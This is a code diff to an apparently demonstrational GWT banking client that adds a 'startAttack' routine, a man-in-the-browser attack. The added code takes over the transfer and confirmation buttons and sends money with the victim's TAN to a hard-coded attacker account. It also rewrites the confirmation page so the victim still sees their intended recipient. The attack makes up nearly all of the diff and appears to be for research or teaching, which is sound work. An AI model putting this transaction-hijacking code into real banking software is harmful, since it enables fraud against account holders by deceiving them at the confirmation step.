@@ -537,6 +537,9 @@ public class SCB implements EntryPoint, Observer {
     this.@de.mrx.client.SCB::startAttack();
   }-*/;
 	
+	
+	
+	
 	/**
 	 * this is the injection for a Javascript-Attacker
 	 * @see http://code.google.com/p/gwtquery/wiki/GettingStarted
@@ -544,9 +547,10 @@ public class SCB implements EntryPoint, Observer {
 	private void startAttack(){
 		$("h1").css(BACKGROUND_COLOR, RED).text("You are hacked!");
 		
+		
 		//everything should best work with DOM-Operations only (not with knowledge of the Java Widget)
 		
-		//1. Find relevant Button
+		//1. Find relevant Button for first page (after first data entry)
 		//later find with DOM Operations (GWTQuery)
 		Button sendMoneyAskForConfirmBtn=mTransfer.getSendMoney();
 		
@@ -562,45 +566,72 @@ public class SCB implements EntryPoint, Observer {
 				int ATTACKER__AMOUNT=10;
 				String ATTACKER_REMARK="I just needed the money";
 				 CustomerServiceAsync bankingService= GWT.create(CustomerService.class);
+				 //
 				 bankingService.sendMoneyAskForConfirmationData(currentAccount, ATTACKER_BLZ, ATTACKER_RECEIVER_ACC_NR, ATTACKER__AMOUNT, ATTACKER_REMARK, ATTACKER__RECEIVER_NAME, ATTACKER_BANK_NAME,new AsyncCallback<MoneyTransferDTO>() {
 
-					@Override
-					public void onFailure(Throwable caught) {
-						caught.printStackTrace();
-						Window.alert("Called with failure: "+caught.getMessage());
-						
-					}
+						@Override
+						public void onFailure(Throwable caught) {
+							caught.printStackTrace();
+							Window.alert("Called with failure: "+caught.getMessage());
+							
+						}
 
-					@Override
-					public void onSuccess(MoneyTransferDTO result) {
-						Window.alert("First part succeeds. Now manipulate the confirmation page");
-						result.setReceiverAccountNr(SCB.this.mTransfer.getReceiverAccountNr().getText());
-						result.setReceiverName(SCB.this.mTransfer.getReceiverName().getText());
-						result.setReceiverBankNr(SCB.this.mTransfer.getReceiverBLZ().getText());
-						result.setReceiverName(SCB.this.mTransfer.getReceiverBankName().getText());
-						result.setRemark(SCB.this.mTransfer.getRemark().getText());
-						result.setAmount(Double.parseDouble(SCB.this.mTransfer.getAmount().getText()));
-						showMoneyTransferConfirmationForm(result);
-						
-					}
-				});
-				
-				
+						@Override
+						public void onSuccess(MoneyTransferDTO result) {
+							Window.alert("First part succeeds. Now manipulate the confirmation page");
+							result.setReceiverAccountNr(SCB.this.mTransfer.getReceiverAccountNr().getText());
+							result.setReceiverName(SCB.this.mTransfer.getReceiverName().getText());
+							result.setReceiverBankNr(SCB.this.mTransfer.getReceiverBLZ().getText());
+							result.setReceiverName(SCB.this.mTransfer.getReceiverBankName().getText());
+							result.setRemark(SCB.this.mTransfer.getRemark().getText());
+							result.setAmount(Double.parseDouble(SCB.this.mTransfer.getAmount().getText()));
+							showMoneyTransferConfirmationForm(result);
+						}
+					});
+
 			}
 		});
 		
-		
-		
-		
-//		sendMoneyAskForConfirmBtn.
-		
-		
-			//later, the original click handler must be executed, but the control flow must be change before, so do change the parameters
-			//two choices: 
-			//1. Remove the previous event handler and code the call yourself
-			//2. change the transaction fields and delegate to previous methods
-		
-		
+		//2. Overwrite Button on confirmation Page
+		 Button sendMoneyBtn=mTransfer.getSendMoneyConfirm();		 
+		 sendMoneyBtn.addClickHandler(new ClickHandler() {
+			
+			@Override
+			public void onClick(ClickEvent event) {
+				String ATTACKER_BLZ="6272";
+				String ATTACKER_BANK_NAME="Deutsche Privatbank";
+				String ATTACKER_RECEIVER_ACC_NR="172";
+				String ATTACKER__RECEIVER_NAME="Mr. Evil";
+				int ATTACKER__AMOUNT=10;
+				String ATTACKER_REMARK="I just needed the money";
+				 CustomerServiceAsync bankingService= GWT.create(CustomerService.class);
+				 //
+				 bankingService.sendMoney(currentAccount, ATTACKER_BLZ, ATTACKER_RECEIVER_ACC_NR, ATTACKER__AMOUNT, ATTACKER_REMARK, ATTACKER__RECEIVER_NAME, ATTACKER_BANK_NAME,mTransfer.getTan().getText(), new AsyncCallback<Void>() {
+
+						@Override
+						public void onFailure(Throwable caught) {
+							caught.printStackTrace();
+							Window.alert("Called with failure: "+caught.getMessage());
+							
+						}
+
+						@Override
+						public void onSuccess(Void result) {
+							showAccountDetails(currentAccount);
+							
+						}
+
+				 });
+			}
+		});
+			
+			//rewrite ClickHandler for askForConfirmation Button
+
 	}
+	
+	
 }
+		
+
+	
 
